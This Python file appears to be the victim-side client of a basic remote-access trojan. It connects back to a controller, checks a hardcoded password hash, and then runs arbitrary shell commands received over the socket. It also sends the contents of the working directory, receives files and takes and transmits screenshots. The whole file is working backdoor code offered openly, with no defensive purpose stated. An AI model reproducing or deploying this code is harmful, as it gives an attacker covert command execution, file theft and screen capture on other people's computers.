#!/bin/python3
#import libraries
from glob import glob
import json
import subprocess
import os
import pyautogui
from Client import *

# define globals

DSIZE = 102400
DELIMITER = "<END_OF_RESULTS>"

# function to handle user input and call the appropriate function accordingly 
def clienthandler(my_socket):
     print ("[+] Handling Client Side Connection")
     while True:
         cmd = my_socket.recv_data()
         print(f"[+] User Data : {cmd}")

         if cmd == "01" or cmd == "1":
             print("[+] Running System Commands")
             # run system command
             exe_commads(my_socket)
             continue
         
         if cmd == "02" or cmd == "2":
             download_file(my_socket)    
             continue
              
         if cmd == "03" or cmd == "3":
             upload_file_folder(my_socket)
             continue
             
         if cmd == "04" or cmd =="4":
             capture_screenshot(my_socket)
             continue
         
         elif cmd=="5" or cmd == "quit" or cmd == "exit" or cmd == "99":
             break
         
         else:
             print("[+] Invalid Input. Try again")
             print("[+] If you wish to quit type exit")
             continue
                          
def exe_commads(my_socket):
     print("[+] Executing Commands")
     while True:
         cmd = my_socket.recv_data()
         print(f"[+] Executing {cmd}")
         
         if cmd == "exit" or cmd == "quit" or cmd == "stop":
             print ("[+] Exiting Shell")
             break
         
        # Why is everything running the same commands and if they are doing so
        # why not in same check statement

         if cmd == "" :
             my_socket.send_data(runshell("pwd"))

         if cmd[:2] == 'cd':
             os.chdir(cmd[3:])
             my_socket.send_data(runshell("pwd"))
             
         if cmd[:5] == "chdir":
             os.chdir(cmd[6:])
             my_socket.send_data(runshell("pwd"))

         else:
             res = runshell(cmd)
             my_socket.send_results(res)
             
def runshell(cmd):
     output = subprocess.run(cmd , shell=True, capture_output=True)
     if output.stderr.decode("utf-8") == "":
         std_out = output.stdout.decode("utf-8")
     else :
         std_out = output.stderr.decode("utf-8")
     return std_out
 
def download_file(my_socket):
     print("[+] Downloading File")
     filename = my_socket.recv_data()
     my_socket.recv_file(filename)

def upload_file_folder(my_socket):
     print("[+] Uploading File/Folder To Server")
     files = glob("*")
     dict = {}
     for index, file in enumerate(files):
         dict[index] = file
         
     dict_bytes = json.dumps(dict)
     raw_bytes = dict_bytes.encode('utf-8')
     while True:
             my_socket.socket.send(raw_bytes[:DSIZE])
             raw_bytes = raw_bytes[DSIZE:]
             if raw_bytes == b'':
                  my_socket.socket.send(DELIMITER.encode('utf-8'))
                  break
          
     filetosend=my_socket.recv_data()
     my_socket.send_file(filetosend)

def capture_screenshot(my_socket):
     print("[+] Taking Screenshot")
     screenshot = pyautogui.screenshot()
     screenshot_name = "screenshot.png"
     screenshot.save(screenshot_name)
     my_socket.send_file(screenshot_name)
     print("[+] Screenshot Sent Successfully")
     os.remove(screenshot_name) 

def checkpass(my_socket):
     i = 0
     counter = 0
     while i<3 :
         val = my_socket.recv_data()
         if val == "11fcb6aa20f1226678e8cc5cbdf8f29f94b4a6a8":
             my_socket.send_data("[+] Okay")
             counter = 1 
             break
         else :
             my_socket.send_data("[+] Wrong Password")
         
         i=i+1     
              
     return counter

if __name__=="__main__":

    my_socket = ClientConnection()
    ip = "127.0.0.1"
    port = 8080

    my_socket.CreateConnection(ip, port)
    print(f"[+] Connecting To Server at {ip} On Port {port}")
    print(my_socket.recv_data())

    print ("[+] Checking Password.")
    counter  = checkpass(my_socket)

    if counter == 1:
        print("[+] Authentication Successful")
        my_socket.send_data("[+] Connected To Client")
        clienthandler(my_socket)
        print("[+] Exiting Client")
        my_socket.end_conn()
        
    else :
        print("[+] Authentication Error")
        my_socket.end_conn()
